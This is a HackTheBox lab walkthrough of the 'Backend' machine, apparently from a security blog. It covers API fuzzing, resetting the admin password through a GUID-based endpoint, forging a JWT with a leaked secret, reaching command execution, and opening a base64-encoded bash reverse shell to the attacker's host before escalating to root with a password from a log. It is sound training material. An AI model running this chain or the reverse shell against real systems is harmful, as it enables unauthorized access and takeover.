---
title: Backend - HackTheBox Walkthrough
date: 2026-02-07 14:30:00 +1100
categories: [HackTheBox, Linux]
tags: [pentesting, api, jwt, fastapi, web-security]
image:
  path: /assets/img/backend-htb.png
  alt: Backend HackTheBox Machine
---

Backend is a medium-difficulty Linux machine from HackTheBox that teaches you how to exploit API vulnerabilities. The box doesn't have a traditional website frontend, just a backend API. We'll fuzz API endpoints, manipulate JWT tokens, abuse debug features and escalate to root by finding credentials in log files.

## Initial Enumeration

Started with a basic nmap scan to see what's open:

```bash
nmap -p- --min-rate=1000 -T4 10.129.227.148
nmap -p22,80 -sC -sV 10.129.227.148
```

Found two ports:
- Port 22: SSH (OpenSSH 8.2p1)
- Port 80: HTTP running Uvicorn (Python web server)

Checking the web service showed it's just a JSON API:

```bash
curl http://10.129.227.148
```

Response: `{"msg": "UHC API Version 1.0"}`

## API Discovery

Since there's no frontend, I needed to find API endpoints. Started fuzzing with gobuster:

```bash
gobuster dir -u http://10.129.227.148/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

This revealed `/api` and `/docs` endpoints. Exploring further:

```bash
curl http://10.129.227.148/api
# {"endpoints": ["v1"]}

curl http://10.129.227.148/api/v1
# {"endpoints": ["user", "admin"]}
```

Testing the user endpoint with ID 1 gave me admin user details:

```bash
curl http://10.129.227.148/api/v1/user/1
```

Got back the admin email (`admin@htb.local`) and their GUID. Saved that GUID for later.

## Finding Hidden Endpoints

Most API fuzzers only check GET requests, but APIs often have POST-only endpoints. Used ffuf to check for POST endpoints:

```bash
ffuf -X POST -u http://10.129.227.148/api/v1/user/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404,405
```

Alternatively, just tested common endpoints manually:

```bash
curl http://10.129.227.148/api/v1/user/login
curl http://10.129.227.148/api/v1/user/signup
```

Both returned errors about missing fields, confirming they exist.

## Creating an Account

Registered a new user account:

```bash
curl -X POST http://10.129.227.148/api/v1/user/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}'
```

This returned an empty JSON `{}`, meaning registration succeeded.

Then logged in. The login endpoint wants URL-encoded data (not JSON):

```bash
curl -X POST http://10.129.227.148/api/v1/user/login \
  -d "username=test@test.com&password=test123"
```

Got back a JWT access token.

## Accessing API Documentation

Used the token to access the protected `/docs` endpoint:

```bash
curl http://10.129.227.148/docs \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"
```

This showed FastAPI's Swagger UI. Also checked `/openapi.json` with the same token to see all available endpoints.

Found an interesting endpoint: `/api/v1/user/updatepass` which lets you update any user's password if you have their GUID.

## Changing Admin Password

Since I had the admin's GUID from earlier, I updated their password:

```bash
curl -X POST http://10.129.227.148/api/v1/user/updatepass \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","password":"admin123"}'
```

Success! Now logged in as admin:

```bash
curl -X POST http://10.129.227.148/api/v1/user/login \
  -d "username=admin@htb.local&password=admin123"
```

Got an admin JWT token with higher privileges.

## Attempting Command Execution

Tried to execute commands using the admin endpoint:

```bash
curl http://10.129.227.148/api/v1/admin/exec/whoami \
  -H "Authorization: Bearer ADMIN_TOKEN"
```

Got an error: `"Debug key missing from JWT"`

This meant I needed to modify the JWT token to add a debug parameter.

## Reading the Application Source

First, I needed to find the JWT signing secret. Used the admin file reading capability:

```bash
curl -X POST http://10.129.227.148/api/v1/admin/file \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"file":"/home/htb/uhc/app/core/config.py"}'
```

Found the JWT secret: `SuperSecretSigningKey-HTB`

## Modifying the JWT Token

Went to https://jwt.io and:
1. Pasted my admin token in the "Encoded" box
2. In the payload section, added `"debug": true` (with a comma after the guid line)
3. In the "Verify Signature" section, changed the secret to `SuperSecretSigningKey-HTB`
4. Copied the new signed token

The payload looked like this:

```json
{
  "type": "access_token",
  "exp": 1771298679,
  "iat": 1770607479,
  "sub": "1",
  "is_superuser": true,
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "debug": true
}
```

## Getting Remote Code Execution

Tested the modified token:

```bash
curl http://10.129.227.148/api/v1/admin/exec/whoami \
  -H "Authorization: Bearer MODIFIED_TOKEN"
```

Got back `"htb"` - command execution works!

## Getting a Shell

Set up a netcat listener:

```bash
nc -lvnp 9090
```

Created a base64-encoded reverse shell payload:

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.15.251/9090 0>&1"' | base64
# Output: YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNTEvOTA5MCAwPiYxIg==
```

Executed it using the debug endpoint (URL-encoded):

```bash
curl "http://10.129.227.148/api/v1/admin/exec/echo%20YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNS4yNTEvOTA5MCAwPiYxIg%3D%3D%20%7C%20base64%20-d%20%7C%20bash" \
  -H "Authorization: Bearer MODIFIED_TOKEN"
```

Got a shell as the `htb` user!

## Privilege Escalation

Once inside, checked the current directory and found an `auth.log` file:

```bash
ls -la
cat auth.log
```

Found a password that someone accidentally typed in the username field: `Tr0ub4dor&3`

Used it to switch to root:

```bash
su -
# Password: Tr0ub4dor&3
```

Got root access!

## Flags

User flag:
```bash
cat /home/htb/user.txt
```

Root flag:
```bash
cat /root/root.txt
```

## Key Takeaways

This box taught me several valuable lessons:

- Always fuzz APIs with different HTTP methods (GET, POST, PUT, etc.), not just GET
- JWT tokens can be decoded and re-signed if you know the secret key
- APIs sometimes have debug features that shouldn't be in production
- Log files can contain sensitive information like passwords
- Reading application source code can reveal secrets and vulnerabilities

Backend was a great learning experience for API security testing and JWT manipulation. The progression felt natural and each step built on the previous one.
